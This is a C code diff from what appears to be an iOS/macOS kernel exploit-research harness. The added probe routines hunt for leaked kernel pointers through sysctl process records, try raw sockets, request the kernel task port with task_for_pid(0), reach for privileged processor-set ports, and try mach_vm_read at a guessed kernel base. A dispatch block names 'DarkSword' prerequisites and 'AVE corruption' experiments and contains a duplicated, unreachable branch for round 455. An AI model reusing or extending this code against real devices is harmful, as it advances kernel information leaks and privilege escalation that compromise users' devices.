+            int ret = sysctl(mib2, 4, &kp2, &sz2, NULL, 0);
+            rlog("    PID %d: sysctl ret=%d size=%zu\n", target_pid, ret, sz2);
+            if (ret == 0 && sz2 > 0) {
+                uint64_t *words = (uint64_t *)&kp2;
+                int nw = (int)(sz2 / 8);
+                int kptrs = 0;
+                for (int i = 0; i < nw; i++) {
+                    uint64_t v = words[i];
+                    if (((v >> 48) == 0xffff || (v >> 48) == 0xfffe) && v != 0 && v != 0xFFFFFFFFFFFFFFFFULL) {
+                        rlog("      PID %d word[%d] (byte %d): 0x%016llx *** KPTR ***\n",
+                             target_pid, i, i * 8, (unsigned long long)v);
+                        kptrs++;
+                    }
+                }
+                rlog("    PID %d: %d kernel ptrs found, e_paddr=0x%016llx\n",
+                     target_pid, kptrs, *(uint64_t *)((uint8_t *)&kp2 + 296));
+            }
+        }
+
+        rlog("    KERN_PROC_ALL scan:\n");
+        int mib_all[3] = {CTL_KERN, KERN_PROC, KERN_PROC_ALL};
+        size_t all_size = 0;
+        if (sysctl(mib_all, 3, NULL, &all_size, NULL, 0) == 0) {
+            rlog("    Total proc data size: %zu bytes (%zu entries)\n",
+                 all_size, all_size / sizeof(struct kinfo_proc));
+            void *all_buf = malloc(all_size + 4096);
+            if (all_buf) {
+                size_t real_size = all_size + 4096;
+                if (sysctl(mib_all, 3, all_buf, &real_size, NULL, 0) == 0) {
+                    int nprocs = (int)(real_size / sizeof(struct kinfo_proc));
+                    int total_kptrs = 0;
+                    int procs_with_kptrs = 0;
+                    for (int pp = 0; pp < nprocs; pp++) {
+                        struct kinfo_proc *kpp = (struct kinfo_proc *)all_buf + pp;
+                        uint64_t *words = (uint64_t *)kpp;
+                        int nw = (int)(sizeof(struct kinfo_proc) / 8);
+                        int this_kptrs = 0;
+                        for (int i = 0; i < nw; i++) {
+                            uint64_t v = words[i];
+                            if (((v >> 48) == 0xffff || (v >> 48) == 0xfffe) && v != 0 && v != 0xFFFFFFFFFFFFFFFFULL) {
+                                this_kptrs++;
+                                total_kptrs++;
+                                if (this_kptrs <= 2 && procs_with_kptrs < 3) {
+                                    rlog("      proc[%d] pid=%d word[%d]: 0x%016llx\n",
+                                         pp, kpp->kp_proc.p_pid, i, (unsigned long long)v);
+                                }
+                            }
+                        }
+                        if (this_kptrs > 0) procs_with_kptrs++;
+                    }
+                    rlog("    KERN_PROC_ALL: %d procs, %d total kptrs across %d procs\n",
+                         nprocs, total_kptrs, procs_with_kptrs);
+                } else {
+                    rlog("    KERN_PROC_ALL sysctl(read) failed: %d\n", errno);
+                }
+                free(all_buf);
+            }
+        } else {
+            rlog("    KERN_PROC_ALL sysctl(size) failed: %d\n", errno);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Vector C: ICMPv6 socket creation ---- */
+    rlog("\n  --- Vector C: ICMPv6 socket creation ---\n");
+    {
+        int sock = socket(AF_INET6, SOCK_RAW, 58);
+        rlog("    socket(AF_INET6, SOCK_RAW, ICMPV6): fd=%d errno=%d\n", sock, sock < 0 ? errno : 0);
+
+        if (sock < 0) {
+            sock = socket(AF_INET6, SOCK_DGRAM, 0);
+            rlog("    socket(AF_INET6, SOCK_DGRAM, 0): fd=%d errno=%d\n", sock, sock < 0 ? errno : 0);
+        }
+
+        if (sock < 0) {
+            sock = socket(AF_INET6, SOCK_STREAM, 0);
+            rlog("    socket(AF_INET6, SOCK_STREAM, 0): fd=%d errno=%d\n", sock, sock < 0 ? errno : 0);
+        }
+
+        if (sock < 0) {
+            sock = socket(AF_INET, SOCK_RAW, 1);
+            rlog("    socket(AF_INET, SOCK_RAW, ICMP): fd=%d errno=%d\n", sock, sock < 0 ? errno : 0);
+        }
+
+        if (sock < 0) {
+            sock = socket(AF_INET, SOCK_DGRAM, 0);
+            rlog("    socket(AF_INET, SOCK_DGRAM, 0): fd=%d errno=%d\n", sock, sock < 0 ? errno : 0);
+        }
+
+        if (sock >= 0) {
+            rlog("    Socket created! Probing getsockopt...\n");
+
+            struct linger ling;
+            socklen_t len = sizeof(ling);
+            int r = getsockopt(sock, SOL_SOCKET, SO_LINGER, &ling, &len);
+            rlog("    SO_LINGER: ret=%d onoff=%d linger=%d\n", r, ling.l_onoff, ling.l_linger);
+
+            int rcvbuf;
+            len = sizeof(rcvbuf);
+            r = getsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, &len);
+            rlog("    SO_RCVBUF: ret=%d val=%d\n", r, rcvbuf);
+
+            int sndbuf;
+            len = sizeof(sndbuf);
+            r = getsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, &len);
+            rlog("    SO_SNDBUF: ret=%d val=%d\n", r, sndbuf);
+
+            int sotype;
+            len = sizeof(sotype);
+            r = getsockopt(sock, SOL_SOCKET, SO_TYPE, &sotype, &len);
+            rlog("    SO_TYPE: ret=%d val=%d\n", r, sotype);
+
+            uint8_t optbuf[512];
+            for (int opt = 0; opt < 32; opt++) {
+                len = sizeof(optbuf);
+                memset(optbuf, 0, sizeof(optbuf));
+                r = getsockopt(sock, SOL_SOCKET, opt, optbuf, &len);
+                if (r == 0 && len > 8) {
+                    rlog("    SOL_SOCKET opt %d: len=%u data:", opt, len);
+                    uint64_t *qp = (uint64_t *)optbuf;
+                    for (int j = 0; j < (int)(len / 8) && j < 4; j++) {
+                        rlog(" 0x%llx", (unsigned long long)qp[j]);
+                    }
+                    rlog("\n");
+                }
+            }
+
+            close(sock);
+        } else {
+            rlog("    All socket types failed in sandbox\n");
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Vector D: kernel memory probing ---- */
+    rlog("\n  --- Vector D: Kernel memory probing ---\n");
+    {
+        rlog("    vm_kernel_page_size=%u\n", (unsigned)vm_kernel_page_size);
+        rlog("    vm_page_size=%u\n", (unsigned)vm_page_size);
+
+        task_dyld_info_data_t dyld_info;
+        mach_msg_type_number_t dyld_cnt = TASK_DYLD_INFO_COUNT;
+        kern_return_t kr = task_info(mach_task_self(), TASK_DYLD_INFO,
+            (task_info_t)&dyld_info, &dyld_cnt);
+        rlog("    TASK_DYLD_INFO: kr=%d addr=0x%llx size=0x%llx\n",
+             kr, (unsigned long long)dyld_info.all_image_info_addr,
+             (unsigned long long)dyld_info.all_image_info_size);
+
+        if (kr == KERN_SUCCESS && dyld_info.all_image_info_addr != 0) {
+            uint64_t *dinfo = (uint64_t *)dyld_info.all_image_info_addr;
+            rlog("    dyld_all_image_infos dump (first 128 bytes):\n");
+            for (int i = 0; i < 16; i++) {
+                uint64_t v = dinfo[i];
+                int is_kptr = ((v >> 48) == 0xffff || (v >> 48) == 0xfffe) && v != 0;
+                rlog("      +%3d: 0x%016llx%s\n", i * 8, (unsigned long long)v,
+                     is_kptr ? " *** KPTR ***" : "");
+            }
+        }
+
+        mach_port_t kport = MACH_PORT_NULL;
+        kr = task_for_pid(mach_task_self(), 0, &kport);
+        rlog("    task_for_pid(0): kr=0x%x port=0x%x\n", kr, kport);
+
+        mach_port_t lport = MACH_PORT_NULL;
+        kr = task_for_pid(mach_task_self(), 1, &lport);
+        rlog("    task_for_pid(1): kr=0x%x port=0x%x\n", kr, lport);
+
+        mach_port_t pset = MACH_PORT_NULL, pset_priv = MACH_PORT_NULL;
+        kr = processor_set_default(mach_host_self(), &pset);
+        rlog("    processor_set_default: kr=0x%x pset=0x%x\n", kr, pset);
+        if (kr == KERN_SUCCESS) {
+            kr = host_processor_set_priv(mach_host_self(), pset, &pset_priv);
+            rlog("    host_processor_set_priv: kr=0x%x pset_priv=0x%x\n", kr, pset_priv);
+            if (kr == KERN_SUCCESS && pset_priv != MACH_PORT_NULL) {
+                task_array_t tasks = NULL;
+                mach_msg_type_number_t task_cnt = 0;
+                kr = processor_set_tasks(pset_priv, &tasks, &task_cnt);
+                rlog("    processor_set_tasks: kr=0x%x count=%u\n", kr, task_cnt);
+            }
+        }
+
+        kernel_version_t kver;
+        kr = host_kernel_version(mach_host_self(), kver);
+        rlog("    host_kernel_version: kr=%d\n", kr);
+        if (kr == KERN_SUCCESS) {
+            rlog("    kernel: %.200s\n", kver);
+        }
+
+        mach_vm_address_t kbase_guess = 0xFFFFFFF007004000ULL;
+        vm_offset_t data_out = 0;
+        mach_msg_type_number_t data_cnt = 0;
+        kr = mach_vm_read(mach_task_self(), kbase_guess, 8, &data_out, &data_cnt);
+        rlog("    mach_vm_read(0x%llx): kr=0x%x\n", (unsigned long long)kbase_guess, kr);
+    }
+    fflush(stdout);
+
+    rlog("\n=== r451 complete ===\n");
+}
+/* OLD r451 body removed — replaced by IOSurface shared mem probe above */
+#if 0
+    int enc_w_DEAD = 128, enc_h_DEAD = 128;
 
     /* Helper: create a minimal IOSurface */
     #define R451_MAKE_SURF(arr, idx) do { \
@@ -17563,7 +18390,7 @@ static void r451_probe(void) {
     #undef R451_PROP_SZ
     #undef R451_MAGIC
 }
-
+#endif
 
 
 static void r449_probe(void) {
@@ -80820,6 +81647,18 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 455) {
+            rlog("*** rounds=455: DarkSword pre-requisite tests ***\n\n");
+            fflush(stdout);
+            r452_probe();
+            goto done;
+        }
+        if (rounds == 455) {
+            rlog("*** rounds=455: AVE zone-sweep + backing store test ***\n\n");
+            fflush(stdout);
+            r452_probe();
+            goto done;
+        }
         if (rounds == 454) {
             rlog("*** rounds=454: AVE corruption CONTROL experiment ***\n\n");
             fflush(stdout);
@@ -83570,7 +84409,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 454 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
